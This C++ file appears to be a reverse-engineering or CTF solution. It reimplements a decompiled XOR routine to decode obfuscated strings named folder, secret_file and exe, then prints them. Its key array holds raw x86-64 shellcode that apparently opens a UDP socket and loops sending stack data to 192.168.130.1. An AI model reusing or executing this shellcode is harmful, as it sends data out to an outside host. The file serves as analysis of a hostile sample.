#include <iostream>
#include <unistd.h>


void func_operator(u_int8_t * param_1, int param_2, u_int8_t *param_3, int param_4){

    u_int8_t *local_20;
    int local_10 = 0;

    for (int i = 0; i < param_2; i = i + 1) {
        *param_1 = *param_1 ^ *(u_int8_t *)(param_3 + local_10 % param_4);
        *param_1 = *param_1 ^ *(u_int8_t *)(param_3 + (local_10 + 1) % param_4);
        *param_1 = *param_1 ^ *(u_int8_t *)(param_3 + (local_10 + 2) % param_4);
        *param_1 = *param_1 ^ *(u_int8_t *)(param_3 + (local_10 + 3) % param_4);
        local_10 += 4;
        param_1 += 1;
    }
    return ;
}


int main() {
    u_int8_t *fifo_file_buf = (u_int8_t *) malloc(sizeof(u_int8_t) * 0x3880);

    u_int64_t folder[] = {
        0xce5f6d84ccd05db3,
        0x7f9b9a42b2cada5d,
        0xa24a,
        0
    };
    u_int64_t secret_file[]={
        0xce5f6d84ccd05db3,
        0x7f9b9a42b2cada5d,
        0x91ab22cddd92a24a,
        0x7388da9d25d8ccf8,
        0,
    };
    u_int64_t exe[]={
        0xd1596484ccd05db3,
        0x62989648a4d1cc52,
        0xd8fe46
    };
    u_int8_t data[] = {0x48, 0x89, 0xe5, 0xb8, 0x29, 0x00, 0x00, 0x00, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xbe, 0x02, 0x00, 0x00, 0x00, 0xba, 0x11, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x89, 0x45, 0xf8, 0x48, 0x89, 0xc7, 0xb8, 0x36, 0x00, 0x00, 0x00, 0xbe, 0x01, 0x00, 0x00, 0x00, 0xba, 0x06, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x55, 0xf0, 0xc7, 0x45, 0xf0, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc6, 0x45, 0xd0, 0x02, 0xc6, 0x45, 0xd1, 0x00, 0xc6, 0x45, 0xd2, 0x22, 0xc6, 0x45, 0xd3, 0xad, 0xc6, 0x45, 0xd4, 0xc0, 0xc6, 0x45, 0xd5, 0xa8, 0xc6, 0x45, 0xd6, 0x82, 0xc6, 0x45, 0xd7, 0x01, 0xc6, 0x45, 0xd8, 0x00, 0xc6, 0x45, 0xd9, 0x00, 0xc6, 0x45, 0xda, 0x00, 0xc6, 0x45, 0xdb, 0x00, 0xc6, 0x45, 0xdc, 0x00, 0xc6, 0x45, 0xdd, 0x00, 0xc6, 0x45, 0xde, 0x00, 0xc6, 0x45, 0xdf, 0x00, 0x48, 0x31, 0xff, 0x8b, 0x7d, 0xf8, 0x48, 0x8d, 0x74, 0x24, 0x18, 0xba, 0x18, 0x00, 0x00, 0x00, 0x41, 0xba, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x45, 0xd0, 0x41, 0xb9, 0x10, 0x00, 0x00, 0x00, 0xb8, 0x2c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0xe6, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x55, 0xe0, 0x48, 0xc7, 0x45, 0xe0, 0x03, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0xba, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe9, 0x69, 0xff, 0xff, 0xff, 0xd8, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00 };

    func_operator((u_int8_t *) folder, 18, data, 65);
    func_operator((u_int8_t *) secret_file, 32, data, 65);
    func_operator((u_int8_t *) exe, 19, data, 65);
    func_operator(fifo_file_buf, 0x3880, data, 65);

    printf("%s\n", (char *)secret_file);
    printf("%s\n", (char *)exe);
    printf("%s\n", (char *)folder);


    u_int64_t local_108[] ={
        0xf87849d0fbfc65da,
        0x7cccb578b28de079,
        0x83ff7fd6e8cec766,
        0
    };
    func_operator((u_int8_t *) local_108, 24, data, 0x41);
    printf("%s\n", (char *)local_108);
    return 0;
}
